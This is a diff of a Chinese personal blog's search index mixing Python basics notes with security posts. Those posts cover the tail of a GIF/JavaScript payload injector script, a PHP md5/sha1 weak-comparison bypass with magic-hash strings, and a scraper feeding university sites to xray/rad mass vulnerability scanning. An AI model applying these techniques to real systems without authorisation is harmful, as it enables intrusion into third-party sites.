is illegal.          |</span></span><br><span class="line"><span class="string">					| It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws.            |</span></span><br><span class="line"><span class="string">					| Authors assume no liability and are not responsible for any misuse or damage caused by this program  |</span></span><br><span class="line"><span class="string">					|======================================================================================================|</span></span><br><span class="line"><span class="string">					&quot;&quot;&quot;</span></span><br><span class="line">         )</span><br><span class="line">	<span class="keyword">if</span> args.inject_to_existing_gif:</span><br><span class="line">		 _inject_into_file(args.js_payload, args.filename)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		_generate_and_write_to_file(args.js_payload, args.filename)</span><br><span class="line"></span><br><span class="line">	_generate_launching_page(args.filename)</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;[+] Finished!&quot;</span></span><br></pre></td></tr></table></figure>
 
 ]]></content>
+      <categories>
+        <category>-penetration</category>
+      </categories>
   </entry>
   <entry>
     <title>欢迎━(*｀∀´*)ノ亻!</title>
@@ -802,21 +805,6 @@
       </categories>
   </entry>
   <entry>
-    <title>sha1和md5绕过</title>
-    <url>/2021/12/27/sha1%E5%92%8Cmd5%E7%BB%95%E8%BF%87/</url>
-    <content><![CDATA[<p>sha1和md5这两个加密函数无法处理数组<br>可用数组让两个数据内容不同但是加密之后都返回false</p>
-<p>还有一种绕过方法md5的</p>
-<p>$str1 = $_GET[‘str1’];<br>$str2 = $_GET[‘str2’];<br>if (md5($str1) == md5($str2)){<br>die(‘OK’); }</p>
-<p>php弱类型比较产生的漏洞</p>
-<p>想要满足这个判断只需要构造出MD5值为0e开头的字符串，这样的话弱类型比较会认为是科学技术法，0的多少次方都是0，因此可以绕过<br>有一些字符串的MD5值为0e开头，这里记录一下</p>
-<p>QNKCDZO<br>240610708<br>s878926199a<br>s155964671a<br>s214587387a<br>还有MD5和双MD5以后的值都是0e开头的</p>
-<p>CbDLytmyGm2xQyaLNhWn<br>770hQgrBOjrcqftrlaZk<br>7r4lGXCH2Ksu2JNT3BYM</p>
-]]></content>
-      <categories>
-        <category>-Experience</category>
-      </categories>
-  </entry>
-  <entry>
     <title>py爬虫-入门（b站课程）</title>
     <url>/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/</url>
     <content><![CDATA[<h1 id="py爬虫-b站课程（入门的知识和基础的应用）"><a href="#py爬虫-b站课程（入门的知识和基础的应用）" class="headerlink" title="py爬虫-b站课程（入门的知识和基础的应用）"></a>py爬虫-b站课程（入门的知识和基础的应用）</h1><h1 id="1-初识requests模块"><a href="#1-初识requests模块" class="headerlink" title="1.初识requests模块"></a>1.初识requests模块</h1><h2 id="1-1分类"><a href="#1-1分类" class="headerlink" title="1.1分类"></a>1.1分类</h2><p>通用爬虫：抓取的是一整张页面数据</p>
@@ -1080,6 +1068,48 @@
 ]]></content>
       <categories>
         <category>-python</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>sha1和md5绕过</title>
+    <url>/2021/12/27/sha1%E5%92%8Cmd5%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<p>sha1和md5这两个加密函数无法处理数组<br>可用数组让两个数据内容不同但是加密之后都返回false</p>
+<p>还有一种绕过方法md5的</p>
+<p>$str1 = $_GET[‘str1’];<br>$str2 = $_GET[‘str2’];<br>if (md5($str1) == md5($str2)){<br>die(‘OK’); }</p>
+<p>php弱类型比较产生的漏洞</p>
+<p>想要满足这个判断只需要构造出MD5值为0e开头的字符串，这样的话弱类型比较会认为是科学技术法，0的多少次方都是0，因此可以绕过<br>有一些字符串的MD5值为0e开头，这里记录一下</p>
+<p>QNKCDZO<br>240610708<br>s878926199a<br>s155964671a<br>s214587387a<br>还有MD5和双MD5以后的值都是0e开头的</p>
+<p>CbDLytmyGm2xQyaLNhWn<br>770hQgrBOjrcqftrlaZk<br>7r4lGXCH2Ksu2JNT3BYM</p>
+]]></content>
+      <categories>
+        <category>-Experience</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>xray+rad 自动化edusrc</title>
+    <url>/2022/02/08/xray-rad-%E8%87%AA%E5%8A%A8%E5%8C%96edusrc/</url>
+    <content><![CDATA[<h1 id="xray-rad-自动化edusrc"><a href="#xray-rad-自动化edusrc" class="headerlink" title="xray+rad 自动化edusrc"></a>xray+rad 自动化edusrc</h1><p>最近挖洞效率低下，学习了下扫描器</p>
+<h1 id="1-爬取漏洞平台上各大学校的网址"><a href="#1-爬取漏洞平台上各大学校的网址" class="headerlink" title="1.爬取漏洞平台上各大学校的网址"></a>1.爬取漏洞平台上各大学校的网址</h1><p><img src="/2022/02/08/xray-rad-%E8%87%AA%E5%8A%A8%E5%8C%96edusrc/image-20220208144944272.png" alt="image-20220208144944272"></p>
+<p>写了个小爬虫，有些会爬到百度百科里面，但是不影响，后面加个判断就好了。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">allpage = <span class="number">199</span></span><br><span class="line">all_school = <span class="built_in">dict</span>()</span><br><span class="line"><span class="comment">#获取学校名字</span></span><br><span class="line">handers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.76&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;开始获取学校名称和网址&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,allpage):</span><br><span class="line">    <span class="comment">#获取学校名称</span></span><br><span class="line">    url = <span class="string">f&#x27;https://src.sjtu.edu.cn/rank/firm/?page=<span class="subst">&#123;page&#125;</span>&#x27;</span></span><br><span class="line">    page_text = requests.get(url,headers=handers).text</span><br><span class="line">    tree = etree.HTML(page_text)</span><br><span class="line">    content = tree.xpath(<span class="string">f&#x27;//tr[@class=&quot;row&quot;]//a//text()&#x27;</span>)</span><br><span class="line">    <span class="comment">#定义一个进度条用的东西</span></span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    <span class="comment">#从bing上获取学校官网</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> content:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(url=<span class="string">f&#x27;https://cn.bing.com/search?q=<span class="subst">&#123;item&#125;</span>&#x27;</span>, headers=handers).text</span><br><span class="line">            tree2 = etree.HTML(response)</span><br><span class="line">            content2 = tree2.xpath(<span class="string">f&#x27;/html/body/div[1]/main/ol/li[1]/div[1]/h2/a/@href&#x27;</span>)</span><br><span class="line">            <span class="comment">#把结果存入字典</span></span><br><span class="line">            all_school[item]=content2[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">print</span>(item + <span class="string">f&#x27;  <span class="subst">&#123;content2[<span class="number">0</span>]&#125;</span>  &#x27;</span>+<span class="string">f&#x27;第<span class="subst">&#123;page&#125;</span>/<span class="subst">&#123;allpage&#125;</span>页----<span class="subst">&#123;index/<span class="number">15</span>*<span class="number">100</span>&#125;</span>%&#x27;</span>)</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;item&#125;</span>出错啦！&quot;</span>)</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line"><span class="comment">#持久化存储</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./学校网址.txt&#x27;</span>,mode=<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> all_school.keys():</span><br><span class="line">        fp.write(<span class="string">f&#x27;<span class="subst">&#123;key&#125;</span>    <span class="subst">&#123;all_school[key]&#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="comment">#单独存储url方便扫描</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;url.txt&#x27;</span>,mode=<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp2:</span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> all_school.values():</span><br><span class="line">        fp2.write(<span class="string">f&#x27;<span class="subst">&#123;value&#125;</span>\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="2-用xray和rad联动扫描url"><a href="#2-用xray和rad联动扫描url" class="headerlink" title="2.用xray和rad联动扫描url"></a>2.用xray和rad联动扫描url</h1><p>工具是别人的</p>
+<p>xray的被动扫描能力很强，但是主动扫描就弱了点，而rad的爬虫功能很强，所以将两种结合起来就能取长补短。但是它们两者不能进行批量检测。所以写了个脚本让两者结合进行批量检测。</p>
+<p>首先将xray与rad所在文件夹加入到环境变量中，环境变量——用户变量——path——编辑</p>
+<p><img src="/2022/02/08/xray-rad-%E8%87%AA%E5%8A%A8%E5%8C%96edusrc/143380522-dc9a5510-1527-4c68-a628-d33460a1ba37.png" alt="image"></p>
+<p>使用的是python3，安装依赖库<br>pip install pypiwin32<br>pip isntall requests</p>
+<p>注意，系统需要装有chrome浏览器<br>之后将要扫描的目标放在url.txt文件中，一个目标一行。接着点击xray批量自动检测.bat</p>
+<p>启动后如下，输入xray扫描后的漏洞文件名，然后rad框中输入任意的数字 </p>
+<p><img src="/2022/02/08/xray-rad-%E8%87%AA%E5%8A%A8%E5%8C%96edusrc/143380572-06ebf313-6064-457f-90be-71b6711db3ae.png" alt="image"></p>
+<p>过程如下 </p>
+<p><img src="/2022/02/08/xray-rad-%E8%87%AA%E5%8A%A8%E5%8C%96edusrc/143380597-5a848ac8-d8d6-4070-8bb0-0879fc7093de.png" alt="image"></p>
+<p> 如果扫描出漏洞后会自动弹出浏览器漏洞报告</p>
+<h2 id="靶场测试"><a href="#靶场测试" class="headerlink" title="靶场测试"></a>靶场测试</h2><p><img src="/2022/02/08/xray-rad-%E8%87%AA%E5%8A%A8%E5%8C%96edusrc/image-20220208162054937.png" alt="image-20220208162054937"></p>
+<p>超！完美！</p>
+<p>链接：<a href="https://pan.baidu.com/s/14pENeqIq-zAIvPgA92n9sw">https://pan.baidu.com/s/14pENeqIq-zAIvPgA92n9sw</a><br>提取码：flag{Favorite anime characters}</p>
+]]></content>
+      <categories>
+        <category>-lunzi</category>
       </categories>
   </entry>
   <entry>
@@ -1352,33 +1382,6 @@
       </categories>
   </entry>
   <entry>
-    <title>xray+rad 自动化edusrc</title>
-    <url>/2022/02/08/xray-rad-%E8%87%AA%E5%8A%A8%E5%8C%96edusrc/</url>
-    <content><![CDATA[<h1 id="xray-rad-自动化edusrc"><a href="#xray-rad-自动化edusrc" class="headerlink" title="xray+rad 自动化edusrc"></a>xray+rad 自动化edusrc</h1><p>最近挖洞效率低下，学习了下扫描器</p>
-<h1 id="1-爬取漏洞平台上各大学校的网址"><a href="#1-爬取漏洞平台上各大学校的网址" class="headerlink" title="1.爬取漏洞平台上各大学校的网址"></a>1.爬取漏洞平台上各大学校的网址</h1><p><img src="/2022/02/08/xray-rad-%E8%87%AA%E5%8A%A8%E5%8C%96edusrc/image-20220208144944272.png" alt="image-20220208144944272"></p>
-<p>写了个小爬虫，有些会爬到百度百科里面，但是不影响，后面加个判断就好了。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">allpage = <span class="number">199</span></span><br><span class="line">all_school = <span class="built_in">dict</span>()</span><br><span class="line"><span class="comment">#获取学校名字</span></span><br><span class="line">handers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.76&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;开始获取学校名称和网址&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,allpage):</span><br><span class="line">    <span class="comment">#获取学校名称</span></span><br><span class="line">    url = <span class="string">f&#x27;https://src.sjtu.edu.cn/rank/firm/?page=<span class="subst">&#123;page&#125;</span>&#x27;</span></span><br><span class="line">    page_text = requests.get(url,headers=handers).text</span><br><span class="line">    tree = etree.HTML(page_text)</span><br><span class="line">    content = tree.xpath(<span class="string">f&#x27;//tr[@class=&quot;row&quot;]//a//text()&#x27;</span>)</span><br><span class="line">    <span class="comment">#定义一个进度条用的东西</span></span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    <span class="comment">#从bing上获取学校官网</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> content:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(url=<span class="string">f&#x27;https://cn.bing.com/search?q=<span class="subst">&#123;item&#125;</span>&#x27;</span>, headers=handers).text</span><br><span class="line">            tree2 = etree.HTML(response)</span><br><span class="line">            content2 = tree2.xpath(<span class="string">f&#x27;/html/body/div[1]/main/ol/li[1]/div[1]/h2/a/@href&#x27;</span>)</span><br><span class="line">            <span class="comment">#把结果存入字典</span></span><br><span class="line">            all_school[item]=content2[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">print</span>(item + <span class="string">f&#x27;  <span class="subst">&#123;content2[<span class="number">0</span>]&#125;</span>  &#x27;</span>+<span class="string">f&#x27;第<span class="subst">&#123;page&#125;</span>/<span class="subst">&#123;allpage&#125;</span>页----<span class="subst">&#123;index/<span class="number">15</span>*<span class="number">100</span>&#125;</span>%&#x27;</span>)</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;item&#125;</span>出错啦！&quot;</span>)</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line"><span class="comment">#持久化存储</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./学校网址.txt&#x27;</span>,mode=<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> all_school.keys():</span><br><span class="line">        fp.write(<span class="string">f&#x27;<span class="subst">&#123;key&#125;</span>    <span class="subst">&#123;all_school[key]&#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="comment">#单独存储url方便扫描</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;url.txt&#x27;</span>,mode=<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp2:</span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> all_school.values():</span><br><span class="line">        fp2.write(<span class="string">f&#x27;<span class="subst">&#123;value&#125;</span>\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<h1 id="2-用xray和rad联动扫描url"><a href="#2-用xray和rad联动扫描url" class="headerlink" title="2.用xray和rad联动扫描url"></a>2.用xray和rad联动扫描url</h1><p>工具是别人的</p>
-<p>xray的被动扫描能力很强，但是主动扫描就弱了点，而rad的爬虫功能很强，所以将两种结合起来就能取长补短。但是它们两者不能进行批量检测。所以写了个脚本让两者结合进行批量检测。</p>
-<p>首先将xray与rad所在文件夹加入到环境变量中，环境变量——用户变量——path——编辑</p>
-<p><img src="/2022/02/08/xray-rad-%E8%87%AA%E5%8A%A8%E5%8C%96edusrc/143380522-dc9a5510-1527-4c68-a628-d33460a1ba37.png" alt="image"></p>
-<p>使用的是python3，安装依赖库<br>pip install pypiwin32<br>pip isntall requests</p>
-<p>注意，系统需要装有chrome浏览器<br>之后将要扫描的目标放在url.txt文件中，一个目标一行。接着点击xray批量自动检测.bat</p>
-<p>启动后如下，输入xray扫描后的漏洞文件名，然后rad框中输入任意的数字 </p>
-<p><img src="/2022/02/08/xray-rad-%E8%87%AA%E5%8A%A8%E5%8C%96edusrc/143380572-06ebf313-6064-457f-90be-71b6711db3ae.png" alt="image"></p>
-<p>过程如下 </p>
-<p><img src="/2022/02/08/xray-rad-%E8%87%AA%E5%8A%A8%E5%8C%96edusrc/143380597-5a848ac8-d8d6-4070-8bb0-0879fc7093de.png" alt="image"></p>
-<p> 如果扫描出漏洞后会自动弹出浏览器漏洞报告</p>
-<h2 id="靶场测试"><a href="#靶场测试" class="headerlink" title="靶场测试"></a>靶场测试</h2><p><img src="/2022/02/08/xray-rad-%E8%87%AA%E5%8A%A8%E5%8C%96edusrc/image-20220208162054937.png" alt="image-20220208162054937"></p>
-<p>超！完美！</p>
-<p>链接：<a href="https://pan.baidu.com/s/14pENeqIq-zAIvPgA92n9sw">https://pan.baidu.com/s/14pENeqIq-zAIvPgA92n9sw</a><br>提取码：flag{Favorite anime characters}</p>
-]]></content>
-      <categories>
-        <category>-lunzi</category>
-      </categories>
-  </entry>
-  <entry>
     <title>一、拓展py：方法和函数拓展 sort sorted</title>
     <url>/2022/01/05/%E4%B8%80%E3%80%81%E6%8B%93%E5%B1%95py%EF%BC%9A%E6%96%B9%E6%B3%95%E5%92%8C%E5%87%BD%E6%95%B0%E6%8B%93%E5%B1%95-sort-sorted/</url>
     <content><![CDATA[<h1 id="python方法和函数拓展-sort-sorted"><a href="#python方法和函数拓展-sort-sorted" class="headerlink" title="python方法和函数拓展 sort sorted"></a>python方法和函数拓展 sort sorted</h1><h2 id="1-sort-与-sorted的区别"><a href="#1-sort-与-sorted的区别" class="headerlink" title="1.sort 与 sorted的区别"></a>1.sort 与 sorted的区别</h2><p>sort是对列表本身进行永久性的排序。</p>
@@ -1425,34 +1428,6 @@
 <h2 id="4-应用扩展"><a href="#4-应用扩展" class="headerlink" title="4.应用扩展"></a>4.应用扩展</h2><p>输入名字（英文），名字在前面形式在后面中间用空格分离，要求根据姓氏排序，姓氏首字母一样就用名字排序，然后输出一个列表，每一个元素装一个名字。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">sName=<span class="built_in">input</span>(<span class="string">&quot;输入名字，名前后姓，quit退出&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;quit&quot;</span></span><br><span class="line">a=[]</span><br><span class="line"><span class="keyword">while</span> sName!=<span class="string">&quot;quit&quot;</span>:</span><br><span class="line">    a.append(sName)</span><br><span class="line">    sName=<span class="built_in">input</span>() <span class="keyword">or</span> <span class="string">&quot;quit&quot;</span></span><br><span class="line"><span class="comment"># 把名字和姓氏组成一个列表嵌套进一个列表中</span></span><br><span class="line">Allname=[x.split() <span class="keyword">for</span> x <span class="keyword">in</span> a]</span><br><span class="line"><span class="comment">#排序</span></span><br><span class="line">Allname.sort(key=<span class="keyword">lambda</span> x:(x[<span class="number">1</span>],x[<span class="number">0</span>]))</span><br><span class="line">final=[]</span><br><span class="line"><span class="comment">#把嵌套的列表转换回来</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Allname)):</span><br><span class="line">    final.append(<span class="string">&quot; &quot;</span>.join(y <span class="keyword">for</span> y <span class="keyword">in</span> Allname[x]))</span><br><span class="line"><span class="built_in">print</span>(final)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-]]></content>
-      <categories>
-        <category>-python</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>一，学习py：{} 布尔 del insert input int（）字符串为空的判断 elif</title>
-    <url>/2021/12/28/%E4%B8%80%EF%BC%8C%E5%AD%A6%E4%B9%A0py%EF%BC%9A-%E5%B8%83%E5%B0%94-del-insert-input-int%EF%BC%88%EF%BC%89%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%BA%E7%A9%BA%E7%9A%84%E5%88%A4%E6%96%AD-elif/</url>
-    <content><![CDATA[<p>一，学习py：{} 布尔 del insert input int（）字符串为空的判断 elif</p>
-<p>1.”a in b”返回布尔值，判断b列表中是否有a。</p>
-<p>2.”x.insert(位置，”内容”)”在列表x中插入数据。</p>
-<p>3.“del .x”可以用来删除变量和列表中的值。</p>
-<p>4.input 读取的值都是字符串</p>
-<p>5.使用“int”关键字来将变量转换为int类型，ex：print( int(a) )</p>
-<p>6.使用“{}”在字符串中引用变量（需要在字符串最前面引号前面加上“f”）</p>
-<p>7.关于字符串为空的判断</p>
-<p>len(s) ==0</p>
-<p>ex：len(s) ==0 则字符串为空if len(username) ==0 or len(password) == 0: #判断输入的用户名或密码是否为空</p>
-<p>isspace判断是否字符串全部是空格</p>
-<p>s.isspace() == Trueif username.isspace() or password.isspace(): #判断输入的用户名或密码是否为空</p>
-<p>8.</p>
-<p>去两边空格：str.strip()</p>
-<p>去左空格：str.lstrip()</p>
-<p>去右空格：str.rstrip()</p>
-<p>去两边字符串：str.strip(‘d’)，相应的也有lstrip，rstrip。</p>
-<p>9.”if”后面用冒号”:{}”</p>
-<p>10.py中的else if = elif</p>
-<p>参考文章：<a href="https://blog.csdn.net/weixin_39725118/article/details/111822050">https://blog.csdn.net/weixin_39725118/article/details/111822050</a></p>
 ]]></content>
       <categories>
         <category>-python</category>
@@ -1510,16 +1485,28 @@
       </categories>
   </entry>
   <entry>
-    <title>三、py拓展：enumerate() 函数</title>
-    <url>/2022/01/09/%E4%B8%89%E3%80%81py%E6%8B%93%E5%B1%95%EF%BC%9Aenumerate-%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<h1 id="三、py拓展：enumerate-函数"><a href="#三、py拓展：enumerate-函数" class="headerlink" title="三、py拓展：enumerate() 函数"></a>三、py拓展：enumerate() 函数</h1><p>enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中。</p>
-<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>以下是 enumerate() 方法的语法:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">enumerate</span>(sequence, [start=<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,]</span><br><span class="line"><span class="keyword">for</span> i,item <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">list</span>):</span><br><span class="line">    <span class="built_in">print</span>(i,item)</span><br><span class="line">    </span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0 2</span></span><br><span class="line"><span class="string">1 3</span></span><br><span class="line"><span class="string">2 4</span></span><br><span class="line"><span class="string">3 5</span></span><br><span class="line"><span class="string">4 5</span></span><br><span class="line"><span class="string">5 6</span></span><br><span class="line"><span class="string">6 7</span></span><br><span class="line"><span class="string">7 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
-
+    <title>一，学习py：{} 布尔 del insert input int（）字符串为空的判断 elif</title>
+    <url>/2021/12/28/%E4%B8%80%EF%BC%8C%E5%AD%A6%E4%B9%A0py%EF%BC%9A-%E5%B8%83%E5%B0%94-del-insert-input-int%EF%BC%88%EF%BC%89%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%BA%E7%A9%BA%E7%9A%84%E5%88%A4%E6%96%AD-elif/</url>
+    <content><![CDATA[<p>一，学习py：{} 布尔 del insert input int（）字符串为空的判断 elif</p>
+<p>1.”a in b”返回布尔值，判断b列表中是否有a。</p>
+<p>2.”x.insert(位置，”内容”)”在列表x中插入数据。</p>
+<p>3.“del .x”可以用来删除变量和列表中的值。</p>
+<p>4.input 读取的值都是字符串</p>
+<p>5.使用“int”关键字来将变量转换为int类型，ex：print( int(a) )</p>
+<p>6.使用“{}”在字符串中引用变量（需要在字符串最前面引号前面加上“f”）</p>
+<p>7.关于字符串为空的判断</p>
+<p>len(s) ==0</p>
+<p>ex：len(s) ==0 则字符串为空if len(username) ==0 or len(password) == 0: #判断输入的用户名或密码是否为空</p>
+<p>isspace判断是否字符串全部是空格</p>
+<p>s.isspace() == Trueif username.isspace() or password.isspace(): #判断输入的用户名或密码是否为空</p>
+<p>8.</p>
+<p>去两边空格：str.strip()</p>
+<p>去左空格：str.lstrip()</p>
+<p>去右空格：str.rstrip()</p>
+<p>去两边字符串：str.strip(‘d’)，相应的也有lstrip，rstrip。</p>
+<p>9.”if”后面用冒号”:{}”</p>
+<p>10.py中的else if = elif</p>
+<p>参考文章：<a href="https://blog.csdn.net/weixin_39725118/article/details/111822050">https://blog.csdn.net/weixin_39725118/article/details/111822050</a></p>
 ]]></content>
       <categories>
         <category>-python</category>
@@ -1719,6 +1706,22 @@
 
 <p>推导式的一个拓展（除去末尾的mp4）</p>
 <p><img src="/2022/01/03/%E4%B8%83%E3%80%81%E5%AD%A6%E4%B9%A0py%EF%BC%9A%E5%87%BD%E6%95%B0/image-20220103205854535.png" alt="image-20220103205854535"></p>
+]]></content>
+      <categories>
+        <category>-python</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>三、py拓展：enumerate() 函数</title>
+    <url>/2022/01/09/%E4%B8%89%E3%80%81py%E6%8B%93%E5%B1%95%EF%BC%9Aenumerate-%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<h1 id="三、py拓展：enumerate-函数"><a href="#三、py拓展：enumerate-函数" class="headerlink" title="三、py拓展：enumerate() 函数"></a>三、py拓展：enumerate() 函数</h1><p>enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中。</p>
+<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>以下是 enumerate() 方法的语法:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">enumerate</span>(sequence, [start=<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,]</span><br><span class="line"><span class="keyword">for</span> i,item <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">list</span>):</span><br><span class="line">    <span class="built_in">print</span>(i,item)</span><br><span class="line">    </span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0 2</span></span><br><span class="line"><span class="string">1 3</span></span><br><span class="line"><span class="string">2 4</span></span><br><span class="line"><span class="string">3 5</span></span><br><span class="line"><span class="string">4 5</span></span><br><span class="line"><span class="string">5 6</span></span><br><span class="line"><span class="string">6 7</span></span><br><span class="line"><span class="string">7 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>-python</category>
